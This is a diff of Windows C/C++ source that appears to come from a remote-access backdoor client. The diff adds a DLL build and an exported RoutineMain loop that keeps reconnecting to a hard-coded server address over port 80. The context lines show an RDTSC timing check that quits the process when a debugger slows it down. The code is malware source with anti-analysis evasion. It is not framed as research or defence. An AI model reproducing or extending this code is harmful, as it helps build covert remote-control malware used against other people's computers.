@@ -73,6 +73,31 @@ unsigned long _stdcall resolve(char *host)
     return i;
 }
 
+SOCKET ConnectServer(int Port, char Addr[])
+{
+	struct sockaddr_in LocalAddr;
+    LocalAddr.sin_family = AF_INET;
+    LocalAddr.sin_port = htons(Port);
+    LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
+	
+    SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0); //Á¬½ÓµÄsocket
+	
+	int timeout = 45000;
+	int err = setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+
+	if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
+    {
+        MsgErr("Can't Connect");
+        return NULL;//connect error
+    }
+    else
+    {
+        TurnonKeepAlive(hSocket, 120);
+    }
+
+	return hSocket;
+}
+
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
@@ -953,6 +978,31 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 	return EXCEPTION_EXECUTE_HANDLER;
 }
 
+
+extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
+{
+	//TCHAR MyPath[MAX_PATH*2];
+	//GetModuleFileName(htempModule, MyPath, sizeof(MyPath));	
+	//CreateFile(MyPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	modify_data.ServerPort = 80;
+	lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+	
+	while (1)
+    {
+    	__try
+    	{
+			ConnectThread(NULL);
+		}
+		__except(1){}
+
+		Sleep(1000);
+	}
+	
+	return 0;
+}
+
+#ifndef DLLBUILD
 int WINAPI WinMain(HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR     lpCmdLine,
@@ -986,21 +1036,18 @@ int WINAPI WinMain(HINSTANCE hInstance,
 	_asm
     {
         RDTSC
-        xchg                 ecx, eax
+        xchg    ecx, eax
         RDTSC
-        sub                eax, ecx
-        cmp                eax, 0FFh
-		jl                OK
-        xor eax,eax
-        push eax
-        call ExitProcess
+        sub     eax, ecx
+        cmp     eax, 0FFh
+		jl      OK
+        xor     eax, eax
+        push    eax
+        call    ExitProcess
     }
 OK:
 #endif
 
-	modify_data.ServerPort = 80;
-	lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
-	
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 	
 	WSADATA lpWSAData;
@@ -1008,16 +1055,29 @@ OK:
 	
 	SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));
 
-	while (1)
-    {
-    	__try
-    	{
-	    	ConnectThread(NULL);
-	    }
-		__except(1){}
-	}
+	RoutineMain(0);
 
     WSACleanup();
 
     return 0;
 }
+
+#else
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
+	{
+		DisableThreadLibraryCalls(hModule);
+
+		//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RoutineMain, NULL, 0, NULL));
+	}
+	else if(ul_reason_for_call == DLL_PROCESS_DETACH)
+	{
+		
+	}	
+	
+	return true;
+}
+
+#endif
